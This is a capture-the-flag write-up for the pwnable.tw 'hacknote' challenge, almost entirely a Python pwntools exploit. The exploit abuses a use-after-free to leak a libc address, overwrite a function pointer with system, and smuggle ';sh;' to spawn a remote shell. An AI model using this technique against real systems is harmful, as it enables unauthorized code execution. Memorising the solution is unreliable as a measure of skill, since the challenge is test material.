# Hack Note
> LongChampion, 26/03/2020

## Ideal
This is a basic `Use After Free` challenges.

## Final Solution
```python
#!/usr/bin/env python2

from pwn import *

put_func = 0x0804862b
read_plt = 0x0804a00c

r = remote("chall.pwnable.tw", 10102)


# Create 2 notes
r.sendlineafter(":", "1")
r.sendlineafter(":", "16")
r.sendlineafter(":", "First note")

r.sendlineafter(":", "1")
r.sendlineafter(":", "16")
r.sendlineafter(":", "Second note")

# Free them
r.sendlineafter(":", "2")
r.sendlineafter(":", "0")
r.sendlineafter(":", "2")
r.sendlineafter(":", "1")

# Create new note, which is exactly note index 0
r.sendlineafter(":", "1")
r.sendlineafter(":", "8")
r.sendafter(":", p32(put_func) + p32(read_plt))

# Print the first note to leak read_plt address
r.sendlineafter(":", "3")
r.sendlineafter(":", "0")
read_addr = u32(r.recv(4))

# Do some math :)
LIBC = ELF("./libc_32.so.6")
LIBC_BASE = read_addr - LIBC.symbols["read"]
system_addr = LIBC_BASE + LIBC.symbols["system"]


# Free note 2 (note 0, too) again
r.sendlineafter(":", "2")
r.sendlineafter(":", "2")

# Re-create it :)
r.sendlineafter(":", "1")
r.sendlineafter(":", "8")
r.sendafter(":", p32(system_addr) + b';sh;')

# Call system(;sh;)
r.sendlineafter(":", "3")
r.sendlineafter(":", "0")

r.interactive()
```
